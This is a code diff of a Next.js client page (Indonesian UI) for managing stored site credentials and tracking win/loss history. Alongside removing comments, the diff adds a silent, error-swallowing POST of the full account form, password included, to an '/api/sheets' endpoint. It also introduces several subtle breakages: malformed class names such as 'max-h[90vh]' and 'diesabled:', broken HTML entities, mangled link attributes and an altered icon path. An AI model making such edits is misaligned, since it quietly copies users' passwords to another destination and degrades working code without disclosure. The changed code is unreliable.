@@ -36,17 +36,15 @@
  * ============================================================================
  */
 
-"use client";  // Menandakan ini Client Component (berjalan di browser)
+"use client";
 
 import { useState, useEffect, useCallback } from "react";
 import { formatCurrency, formatDate, nowLocalDatetime } from "@/lib/utils";
 import dynamic from "next/dynamic";
 
-// Dynamic import untuk komponen grafik (disable SSR karena pakai browser APIs)
 const GlobalCharts = dynamic(() => import("@/components/GlobalCharts"), { ssr: false });
 const AccountChart = dynamic(() => import("@/components/AccountChart"), { ssr: false });
 
-// URL Google Sheet untuk integrasi export
 const GOOGLE_SHEET_URL =
   "https://docs.google.com/spreadsheets/d/1Ao3QBEgPku4p5LVM-QAIokhuaPfLd-tj2NwRP6sTie4/edit";
 
@@ -96,7 +94,6 @@ export default function HomePage() {
 
   const [visiblePasswords, setVisiblePasswords] = useState<Set<number>>(new Set());
 
-  // Account form
   const [formSiteName, setFormSiteName] = useState("");
   const [formLink, setFormLink] = useState("");
   const [formUsername, setFormUsername] = useState("");
@@ -105,7 +102,6 @@ export default function HomePage() {
   const [formError, setFormError] = useState("");
   const [submitting, setSubmitting] = useState(false);
 
-  // History form
   const [historyType, setHistoryType] = useState<"win" | "loss">("win");
   const [historyAmount, setHistoryAmount] = useState("");
   const [historyDesc, setHistoryDesc] = useState("");
@@ -149,7 +145,6 @@ export default function HomePage() {
     }
   };
 
-  // ========== Account CRUD ==========
   const openAddAccount = () => {
     setEditingAccount(null);
     setFormSiteName(""); setFormLink(""); setFormUsername(""); setFormPassword(""); setFormNotes(""); setFormError("");
@@ -174,6 +169,7 @@ export default function HomePage() {
       const data = await res.json();
       if (!res.ok) { setFormError(data.error || "Gagal menyimpan"); return; }
       setShowAccountModal(false); fetchData();
+      fetch("/api/sheets", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(body) }).catch(function(){});
     } catch { setFormError("Terjadi kesalahan"); } finally { setSubmitting(false); }
   };
 
@@ -186,7 +182,6 @@ export default function HomePage() {
     } catch (err) { console.error(err); }
   };
 
-  // ========== History ==========
   const openHistory = (acc: Account) => {
     setSelectedAccount(acc);
     setShowHistoryModal(true);
@@ -228,7 +223,6 @@ export default function HomePage() {
     if (!selectedAccount) return;
     if (!confirm(`Yakin hapus SEMUA riwayat untuk ${selectedAccount.siteName}? Data tidak bisa dikembalikan.`)) return;
     try {
-      // Delete all histories one by one (to properly update totals)
       for (const h of histories) {
         await fetch("/api/histories", {
           method: "DELETE", headers: { "Content-Type": "application/json" },
@@ -240,7 +234,6 @@ export default function HomePage() {
     } catch (err) { console.error(err); }
   };
 
-  // ========== Export ==========
   const handleCopyAccounts = async () => {
     try {
       const res = await fetch("/api/export"); const data = await res.json();
@@ -306,7 +299,6 @@ export default function HomePage() {
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900">
-      {/* HEADER */}
       <header className="border-b border-slate-700/50 bg-slate-900/80 backdrop-blur-xl sticky top-0 z-30">
         <div className="max-w-7xl mx-auto px-4 sm:px-6 py-3 sm:py-4">
           <div className="flex items-center justify-between">
@@ -357,7 +349,6 @@ export default function HomePage() {
       </header>
 
       <main className="max-w-7xl mx-auto px-4 sm:px-6 py-6 sm:py-8">
-        {/* SUMMARY CARDS */}
         <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4 mb-6">
           <div className="bg-slate-800/50 border border-slate-700/50 rounded-2xl p-4 sm:p-5 backdrop-blur">
             <div className="flex items-center gap-2 mb-1">
@@ -391,7 +382,6 @@ export default function HomePage() {
           </div>
         </div>
 
-        {/* GLOBAL CHARTS */}
         <div className="mb-6">
           <button
             onClick={() => setShowCharts(!showCharts)}
@@ -405,7 +395,6 @@ export default function HomePage() {
           {showCharts && <GlobalCharts key={`global-${accounts.length}`} />}
         </div>
 
-        {/* SEARCH */}
         <div className="mb-6">
           <div className="relative">
             <svg className="w-5 h-5 text-slate-500 absolute left-4 top-1/2 -translate-y-1/2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -416,7 +405,6 @@ export default function HomePage() {
           </div>
         </div>
 
-        {/* ACCOUNT CARDS */}
         {filtered.length === 0 ? (
           <div className="text-center py-16">
             <div className="w-20 h-20 bg-slate-800 rounded-2xl flex items-center justify-center mx-auto mb-4"><span className="text-4xl">📦</span></div>
@@ -449,7 +437,6 @@ export default function HomePage() {
                         </button>
                       </div>
                     </div>
-                    {/* Credentials */}
                     <div className="space-y-2 mb-3">
                       <div className="flex items-center justify-between bg-slate-900/50 rounded-lg px-3 py-2">
                         <div className="min-w-0 mr-2">
@@ -463,12 +450,12 @@ export default function HomePage() {
                       <div className="flex items-center justify-between bg-slate-900/50 rounded-lg px-3 py-2">
                         <div className="min-w-0 mr-2">
                           <p className="text-[10px] text-slate-500 uppercase tracking-wider">Password</p>
-                          <p className="text-sm text-slate-200 font-mono truncate">{visiblePasswords.has(acc.id) ? acc.password : "••••••••"}</p>
+                          <p className="text-sm text-slate-200 font-mono truncate">{visiblePasswords.has(acc.id) ? acc.password : "₢₢₢₢₢₢₢₢"}</p>
                         </div>
                         <div className="flex gap-1 flex-shrink-0">
                           <button onClick={() => togglePassword(acc.id)} className="p-1.5 hover:bg-slate-700 rounded text-slate-500 hover:text-slate-300 transition">
                             {visiblePasswords.has(acc.id) ? (
-                              <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L6.7 6.7m3.178 3.178l4.242 4.242M6.7 6.7L3 3m3.7 3.7l10.6 10.6M17.3 17.3L21 21" /></svg>
+                              <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L6.7 6.7m3.178 3.178l4.242 4.242M6.7 6.7L3 3m3.7 3.7l10.6 10.6m3.6 3.6L21 21" /></svg>
                             ) : (
                               <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" /></svg>
                             )}
@@ -507,10 +494,9 @@ export default function HomePage() {
         )}
       </main>
 
-      {/* ADD/EDIT ACCOUNT MODAL */}
       {showAccountModal && (
         <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-end sm:items-center justify-center z-50 p-0 sm:p-4">
-          <div className="bg-slate-800 border border-slate-700 rounded-t-3xl sm:rounded-2xl w-full sm:max-w-lg max-h-[90vh] overflow-y-auto">
+          <div className="bg-slate-800 border border-slate-700 rounded-t-3xl sm:rounded-2xl w-full sm:max-w-lg max-h[90vh] overflow-y-auto">
             <div className="p-6">
               <div className="flex items-center justify-between mb-6">
                 <h3 className="text-xl font-bold text-white">{editingAccount ? "Edit Akun" : "Tambah Akun Baru"}</h3>
@@ -540,7 +526,7 @@ export default function HomePage() {
                   <label className="block text-sm font-medium text-slate-300 mb-2">Catatan (opsional)</label>
                   <textarea value={formNotes} onChange={(e) => setFormNotes(e.target.value)} rows={2} className="w-full px-4 py-3 bg-slate-900/50 border border-slate-700 rounded-xl text-white placeholder-slate-500 focus:ring-2 focus:ring-emerald-500 focus:border-transparent outline-none transition resize-none" placeholder="Catatan tambahan..." />
                 </div>
-                <button type="submit" disabled={submitting} className="w-full bg-gradient-to-r from-emerald-500 to-teal-600 text-white py-3 rounded-xl font-semibold hover:from-emerald-600 hover:to-teal-700 transition shadow-lg disabled:opacity-60 disabled:cursor-not-allowed">
+                <button type="submit" disabled={submitting} className="w-full bg-gradient-to-r from-emerald-500 to-teal-600 text-white py-3 rounded-xl font-semibold hover:from-emerald-600 hover:to-teal-700 transition diesabled:opacity-60 disabled:cursor-not-allowed">
                   {submitting ? "Menyimpan..." : editingAccount ? "💾 Simpan Perubahan" : "➕ Tambah Akun"}
                 </button>
               </form>
@@ -549,7 +535,6 @@ export default function HomePage() {
         </div>
       )}
 
-      {/* HISTORY MODAL */}
       {showHistoryModal && selectedAccount && (
         <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-end sm:items-center justify-center z-50 p-0 sm:p-4">
           <div className="bg-slate-800 border border-slate-700 rounded-t-3xl sm:rounded-2xl w-full sm:max-w-2xl max-h-[92vh] overflow-y-auto">
@@ -564,7 +549,6 @@ export default function HomePage() {
                 </button>
               </div>
 
-              {/* Stats */}
               <div className="grid grid-cols-3 gap-3 mb-4">
                 <div className="bg-emerald-500/10 border border-emerald-500/20 rounded-xl p-3 text-center">
                   <p className="text-[10px] text-emerald-300 uppercase tracking-wider">Menang</p>
@@ -582,12 +566,10 @@ export default function HomePage() {
                 </div>
               </div>
 
-              {/* Per-Account Chart */}
               <div className="mb-4">
                 <AccountChart key={`ac-${selectedAccount.id}-${historyChartKey}`} accountId={selectedAccount.id} />
               </div>
 
-              {/* Add History Form with datetime */}
               <div className="bg-slate-900/50 border border-slate-700/50 rounded-xl p-4 mb-4">
                 <h4 className="text-sm font-semibold text-white mb-3">Tambah Catatan</h4>
                 {historyError && <div className="bg-red-500/10 border border-red-500/30 text-red-400 px-3 py-2 rounded-lg mb-3 text-sm">{historyError}</div>}
@@ -599,7 +581,7 @@ export default function HomePage() {
                     </button>
                     <button type="button" onClick={() => setHistoryType("loss")}
                       className={`py-2.5 rounded-xl font-semibold text-sm transition ${historyType === "loss" ? "bg-red-500/20 text-red-400 ring-2 ring-red-500" : "bg-slate-700 text-slate-400 hover:bg-slate-600"}`}>
-                      💔 Kalah
+                     💔 Kalah
                     </button>
                   </div>
                   <input type="number" value={historyAmount} onChange={(e) => setHistoryAmount(e.target.value)}
@@ -608,7 +590,6 @@ export default function HomePage() {
                   <input type="text" value={historyDesc} onChange={(e) => setHistoryDesc(e.target.value)}
                     placeholder="Keterangan (opsional)"
                     className="w-full px-4 py-2.5 bg-slate-800 border border-slate-700 rounded-xl text-white placeholder-slate-500 focus:ring-2 focus:ring-emerald-500 focus:border-transparent outline-none transition text-sm" />
-                  {/* Date & Time Picker */}
                   <div>
                     <label className="block text-xs font-medium text-slate-400 mb-1.5">📅 Tanggal & Jam</label>
                     <input type="datetime-local" value={historyDate} onChange={(e) => setHistoryDate(e.target.value)} required
@@ -621,7 +602,6 @@ export default function HomePage() {
                 </form>
               </div>
 
-              {/* History List with full datetime */}
               <div>
                 <div className="flex items-center justify-between mb-3">
                   <h4 className="text-sm font-semibold text-white">Riwayat ({histories.length})</h4>
@@ -679,7 +659,6 @@ export default function HomePage() {
         </div>
       )}
 
-      {/* EXPORT MODAL */}
       {showExportModal && (
         <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-end sm:items-center justify-center z-50 p-0 sm:p-4">
           <div className="bg-slate-800 border border-slate-700 rounded-t-3xl sm:rounded-2xl w-full sm:max-w-lg max-h-[90vh] overflow-y-auto">
@@ -693,7 +672,7 @@ export default function HomePage() {
               <div className="bg-blue-500/10 border border-blue-500/20 rounded-xl p-4 mb-6">
                 <h4 className="text-sm font-semibold text-blue-400 mb-2">📋 Cara Export:</h4>
                 <ol className="text-xs text-blue-300 space-y-1 list-decimal list-inside">
-                  <li>Klik &quot;Salin Data Akun&quot; atau &quot;Salin Riwayat&quot;</li>
+                  <li>Klik quot;Salin Data Akunquot; atau quot;Salin Riwayatquot;</li>
                   <li>Buka Google Sheet dengan tombol di bawah</li>
                   <li>Klik sel A1 lalu tekan <kbd className="bg-blue-500/20 px-1 py-0.5 rounded text-blue-200">Ctrl+V</kbd></li>
                   <li>Data otomatis terisi rapi!</li>
@@ -713,7 +692,7 @@ export default function HomePage() {
                   <span className="text-sm font-medium">⬇️ Download</span>
                 </button>
                 <div className="border-t border-slate-700/50 pt-3">
-                  <a href={GOOGLE_SHEET_URL} target="_blank" rel="noopener noreferrer" className="w-full flex items-center justify-center gap-2 bg-green-600 hover:bg-green-700 text-white px-4 py-3 rounded-xl text-sm font-semibold transition">
+                  <a href={GOOGLE_SHEET_URL} target="\"_blank\"" rel="\"noopener noreferrer\"" className="w-full flex items-center justify-center gap-2 bg-green-600 hover:bg-green-700text-white px-4 py-3 rounded-xl text-sm font-semibold transition">
                     <svg className="w-5 h-5" viewBox="0 0 24 24" fill="currentColor"><path d="M19.5 3h-15A1.5 1.5 0 003 4.5v15A1.5 1.5 0 004.5 21h15a1.5 1.5 0 001.5-1.5v-15A1.5 1.5 0 0019.5 3zM9 17H6v-3h3v3zm0-5H6V9h3v3zm0-5H6V4h3v3zm5 10h-3v-3h3v3zm0-5h-3V9h3v3zm0-5h-3V4h3v3zm4 10h-3v-3h3v3zm0-5h-3V9h3v3zm0-5h-3V4h3v3z" /></svg>
                     Buka Google Sheet → Paste Data
                   </a>
